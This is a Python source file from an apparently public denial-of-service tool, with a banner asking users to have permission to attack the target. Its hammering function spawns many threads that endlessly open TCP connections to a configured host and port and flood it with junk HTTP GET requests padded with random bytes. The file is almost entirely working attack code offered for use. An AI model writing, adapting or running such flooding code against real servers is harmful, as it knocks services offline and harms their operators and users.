"""
/*
 * This DOS-TOOL was written by depascaldc ( Discord: depascaldc#1234 ) < service@depascaldc.de >
 * Copying for PRIVATE usage is allowed as long as you don't mention it as your own.
 * Copyright (C) 2020 | depascaldc | All Rights Reserved
 *  
 */
"""
"""
    ____       ____      _____           _ 
    |  _ \  ___/ ___|    |_   _|__   ___ | |
    | | | |/ _ \___ \ _____| |/ _ \ / _ \| |
    | |_| | (_) |__) |_____| | (_) | (_) | |
    |____/ \___/____/      |_|\___/ \___/|_|

            written by: depascaldc
            for private USAGE ONLY
            Make sure you have the
            permission to attack the
                given host
                
"""

import socket
import random
from threading import Thread
from config import Config

config = Config()


def hammering():
    host = config.ATKIPv4
    port = config.ATKPort
    speedPerRun = config.Hammer_PARAMETERS["hits"]
    threads = config.Hammer_PARAMETERS["threads"]
    ip = socket.gethostbyname(host)
    bytesToSend = random._urandom(config.ATKBytes)

    def goForDosThatThing():
        try:
            while True:
                dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    dosSocket.connect((ip, port))
                    for i in range(speedPerRun):
                        try:
                            dosSocket.send(
                                str.encode("GET ")
                                + bytesToSend
                                + str.encode(" HTTP/1.1 \r\n")
                            )
                            dosSocket.sendto(
                                str.encode("GET ")
                                + bytesToSend
                                + str.encode(" HTTP/1.1 \r\n"),
                                (ip, port),
                            )
                        except socket.error:
                            print("ERROR, Maybe the host is down?!?!")
                        except KeyboardInterrupt:
                            print("\r\n[-] Canceled by user")
                except socket.error:
                    print("ERROR, Maybe the host is down?!?!")
                except KeyboardInterrupt:
                    print("\r\n[-] Canceled by user")
                dosSocket.close()
        except KeyboardInterrupt:
            print("\r\n[-] Canceled by user")

    print(f" [+] Hammering server {host}")
    try:
        for i in range(threads):
            try:
                t = Thread(target=goForDosThatThing)
                t.start()
            except KeyboardInterrupt:
                print("\r\n[-] Canceled by user")
    except KeyboardInterrupt:
        print("\r\n[-] Canceled by user")
